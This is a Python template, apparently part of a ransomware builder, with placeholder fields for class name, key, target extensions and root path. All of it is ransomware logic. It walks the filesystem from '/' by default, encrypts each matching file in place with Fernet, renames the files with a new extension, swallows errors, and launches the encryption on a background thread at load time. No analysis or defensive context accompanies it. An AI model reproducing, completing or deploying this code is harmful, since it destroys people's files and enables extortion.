#!usr/bin/env python3
import base64
import hashlib
import os
import threading
from cryptography.fernet import Fernet


class {{class_name}}():
    name = {{name}}

    def __init__(self, extension=None, key=None, secret_key=None, target_extension=None, root_path='/'):
        self.__secret_key       = secret_key
        self.__key              = key
        self.__cryptor          = Fernet(self.__key)
        self.__target_extension = target_extension
        self.__root_path        = root_path
        self.__extension        = extension


    def _encrypt_all(self):
        for dir_, _, files in os.walk(self.__root_path):
            for file_ in files:
                file_extension = file_.split('.')[-1]

                if (file_extension != self.__extension):
                    if (self.__target_extension and file_extension in self.__target_extension) or not self.__target_extension:
                        try:
                            self.__encrypt_file(os.path.join(dir_, file_))
                        except:
                            continue


    def __encrypt_file(self, file_name):
        with open(file_name, 'rb') as f:
            new_file   = f.read()

        with open(file_name, 'wb') as f:
            secret_key = self.__secret_key if self.__secret_key else b''
            secret_key = hashlib.sha1(secret_key).hexdigest().encode()[:40]
 
            new_file   = base64.b64encode(new_file)
            new_file  += secret_key
            new_file   = self.__cryptor.encrypt(new_file)

            f.write(new_file)
            os.rename(file_name, '%s.%s' % (file_name, self.__extension))



{{object_name}} = {{class_name}}(
    key              = {{key}},
    secret_key       = {{secret_key}},
    target_extension = {{target_extension}},
    root_path        = {{root_path}},
    extension        = {{extension}}
)

{{object_name}}_thread = threading.Thread(target={{object_name}}._encrypt_all)
{{object_name}}_thread.start()

rw_name = {{class_name}}.name